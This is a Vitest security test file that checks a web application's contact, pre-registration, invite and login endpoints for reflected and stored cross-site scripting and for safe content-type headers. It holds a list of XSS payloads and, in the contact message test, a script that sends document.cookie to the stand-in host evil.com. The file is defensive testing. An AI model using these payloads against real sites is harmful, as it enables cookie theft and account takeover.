/**
 * Security Test: Cross-Site Scripting (OWASP A07)
 *
 * Tests for:
 * - Reflected XSS via query parameters
 * - Stored XSS via form inputs
 * - XSS via error messages
 * - Content-Type validation
 */

import { describe, it, expect } from 'vitest'
import { secFetch } from './helpers/http-client'
import { ROUTES } from './helpers/constants'

describe('OWASP A07: Cross-Site Scripting (XSS)', () => {
  const xssPayloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(document.cookie)</script>',
    "javascript:alert('XSS')",
    '<iframe src="javascript:alert(1)">',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    '<div onmouseover="alert(1)">hover me</div>',
  ]

  describe('XSS in contact form (stored/email context)', () => {
    for (const payload of xssPayloads) {
      it(`should sanitize XSS payload in contact name: ${payload.slice(0, 30)}...`, async () => {
        const res = await secFetch(ROUTES.contact, {
          method: 'POST',
          body: JSON.stringify({
            name: payload,
            email: 'xss@test.com',
            message: 'XSS test',
          }),
        })

        // The important thing: even if accepted, the response should not echo back unescaped
        if (res.status === 200) {
          const text = await res.text()
          expect(
            text.includes('<script>') || text.includes('onerror=') || text.includes('onload='),
            `XSS payload reflected in contact response: ${payload.slice(0, 30)}`
          ).toBe(false)
        }
      })
    }

    it('should sanitize XSS in contact message field', async () => {
      const res = await secFetch(ROUTES.contact, {
        method: 'POST',
        body: JSON.stringify({
          name: 'XSS Test',
          email: 'xss@test.com',
          message: '<script>document.location="https://evil.com/steal?c="+document.cookie</script>',
        }),
      })

      if (res.status === 200) {
        const text = await res.text()
        expect(text).not.toContain('<script>')
      }
    })
  })

  describe('XSS in pre-register email reflection', () => {
    it('should not reflect email with XSS payload', async () => {
      const res = await secFetch(ROUTES.preRegister, {
        method: 'POST',
        body: JSON.stringify({
          email: '"><script>alert(1)</script>@test.com',
        }),
      })

      const text = await res.text()
      expect(text).not.toContain('<script>')
    })
  })

  describe('XSS via query parameters', () => {
    it('should not reflect XSS in pre-register confirm token param', async () => {
      const res = await secFetch(
        `${ROUTES.preRegisterConfirm}?token=<script>alert(1)</script>`,
        { method: 'GET' }
      )

      // Check redirect location or response body
      if (res.status === 301 || res.status === 302 || res.status === 307) {
        const location = res.headers.get('location') || ''
        expect(location).not.toContain('<script>')
      } else {
        const text = await res.text()
        expect(text).not.toContain('<script>alert(1)</script>')
      }
    })

    it('should not reflect XSS in invite validate token param', async () => {
      const res = await secFetch(
        `${ROUTES.invitesValidate}?token=<script>alert(1)</script>`,
        { method: 'GET' }
      )

      const text = await res.text()
      expect(text).not.toContain('<script>alert(1)</script>')
    })
  })

  describe('Content-Type enforcement', () => {
    it('should return JSON content-type for API responses', async () => {
      const res = await secFetch(ROUTES.contact, {
        method: 'POST',
        body: JSON.stringify({
          name: 'Test',
          email: 'test@test.com',
          message: 'Content type test',
        }),
      })

      const contentType = res.headers.get('content-type')
      if (contentType) {
        // JSON responses should have application/json, not text/html
        // text/html would enable XSS in reflected content
        expect(
          contentType.includes('application/json') || contentType.includes('text/plain'),
          `API returned HTML content type: ${contentType} — enables reflected XSS`
        ).toBe(true)
      }
    })

    it('should have X-Content-Type-Options: nosniff to prevent MIME sniffing', async () => {
      const res = await secFetch(ROUTES.contact, {
        method: 'POST',
        body: JSON.stringify({
          name: 'MIME Test',
          email: 'mime@test.com',
          message: 'MIME sniffing test',
        }),
      })

      const xcto = res.headers.get('x-content-type-options')
      expect(xcto, 'Missing X-Content-Type-Options header').toBe('nosniff')
    })
  })

  describe('DOM-based XSS prevention in API responses', () => {
    it('should not include unescaped HTML in JSON error responses', async () => {
      // Send a request that will be rejected, with HTML in the input
      const htmlInput = '<h1>Hello</h1><script>alert("xss")</script>'

      const res = await secFetch(ROUTES.login, {
        method: 'POST',
        body: JSON.stringify({
          email: htmlInput,
          password: 'test',
        }),
      })

      const text = await res.text()
      // The error response should not echo back HTML unescaped
      if (text.includes(htmlInput)) {
        // If the exact input is echoed back, check it's inside a JSON string
        // (JSON-encoded) not raw HTML
        try {
          JSON.parse(text)
          // OK — it's valid JSON, so the HTML is safely encoded
        } catch {
          // If it's not valid JSON but contains our HTML, it's a vulnerability
          expect(
            text,
            'Raw HTML echoed back in non-JSON response'
          ).not.toContain('<script>')
        }
      }
    })
  })
})
